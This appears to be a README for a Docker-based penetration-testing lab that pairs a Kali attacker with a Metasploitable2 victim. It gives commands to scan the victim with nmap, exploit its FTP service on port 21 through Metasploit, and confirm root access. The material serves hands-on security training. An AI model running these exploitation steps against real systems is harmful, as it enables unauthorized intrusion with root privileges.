
## Setup 

```bash
make up
make ps
```

```bash
make logs container=meta2
make logs container=kali 
```

```bash
make access container=meta2
make access container=kali
```

In each container, run:

```bash
ifconfig # you should see 172.20.0.3 for the attacker and 172.20.0.2 for the victim 
```

From kali, run:

```bash
nmap -F 172.20.0.2
```

## Penetration

From kali:

```bash
nmap -sV -p 21 172.20.0.2
```

```bash
msfconsole
use 1
set rhosts 172.20.0.2
set rport 21
exploit
```

Now to check previliges, directly type:

```bash
touch you_are_pwned
```

```bash
whoami #root
```
## Stop the containers

```bash
make down
```
